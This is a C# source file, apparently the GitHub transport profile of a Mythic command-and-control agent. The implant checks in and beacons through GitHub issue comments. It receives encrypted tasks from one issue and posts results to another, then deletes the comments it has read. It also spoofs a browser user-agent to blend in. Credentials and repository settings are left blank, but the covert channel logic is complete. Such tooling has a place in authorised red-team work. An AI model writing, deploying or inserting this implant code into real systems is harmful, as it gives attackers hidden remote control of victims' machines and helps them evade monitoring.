using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text;
using System.Text.Json;
using System.Net.Http;

namespace Agent.Profiles
{
    public class GitHub : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private AutoResetEvent clientReady = new AutoResetEvent(false);
        private readonly string _uuid = Guid.NewGuid().ToString();
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        private static readonly HttpClient client = new HttpClient();
        private const string GITHUB_TOKEN = "";
        private const string OWNER = "";
        private const string REPO = "";
        private const int SERVER_ISSUE = 1;
        private const int CLIENT_ISSUE = 2;
        private const string URL = $"";
        public GitHub(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            crypt = crypto;
            agentConfig = config;
            this.messageManager = messageManager;

            client.DefaultRequestHeaders.Add("Authorization", $"token {GITHUB_TOKEN}");
            client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.v3+json");
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            // Post Checkin
            //Console.WriteLine($"Checkin UUID: {agentConfig.uuid}");

            // Send Checkin
            PostComment(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                // Relax.. wait for Mythic to post a checkin response 
                // to GitHub for the agent to retrieve 
                await Task.Delay(3000);

                List<string> comments = await GetComments();
                // there should only be one valid comment returned since it's the checkin response
                if (comments.Count == 1)
                {
                    this.checkedin = true;
                    this.cir = JsonSerializer.Deserialize<CheckinResponse>(comments[0]);
                    return this.cir;
                }
                //Console.WriteLine("Checkin Response not received yet");
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);
            
            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            //Console.WriteLine($"Start beacon UUID: {agentConfig.uuid}");
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                //Console.WriteLine("Checking In");
                // Check if we have responses to send
                if (this.messageManager.HasResponses())
                {
                    await PostComment(await messageManager.GetAgentResponseStringAsync());
                }

                // Check for new tasks
                List<string> comments = await GetComments();
                if (comments.Count() > 0) {    
                    foreach (var comment in comments) 
                    {
                        GetTaskingResponse gtr = JsonSerializer.Deserialize<GetTaskingResponse>(comment);
                        TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                        this.SetTaskingReceived(this, tra);
                    }
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }

                // Rest
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        internal async Task<List<string>> GetComments()
        {
            // Get all comments
            var response = await client.GetAsync($"{URL}/{SERVER_ISSUE}/comments");
            response.EnsureSuccessStatusCode();
            var jsonResponse = await response.Content.ReadAsStringAsync();

            var comments = JsonSerializer.Deserialize<List<Dictionary<string, object>>>(jsonResponse);
            var result = new List<string>();
            foreach (var comment in comments)
            {
                // check if message is for us
                var msg = Encoding.UTF8.GetString(Convert.FromBase64String(comment["body"].ToString()));
                var payloadUuid = msg.Substring(0, 36);
                if (payloadUuid == agentConfig.uuid)
                {
                    result.Add(this.crypt.Decrypt(comment["body"].ToString()));
                    //delete comment
                    await client.DeleteAsync($"{URL}/comments/{comment["id"].ToString()}");
                }
            }
            return result;
        }

        internal async Task PostComment(string json)
        {
            //Console.WriteLine(json);
            string msg = this.crypt.Encrypt(json);
            var url = $"{URL}/{CLIENT_ISSUE}/comments";
            var payload = new { body = msg };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            await client.PostAsync(url, content);
        }
    }
}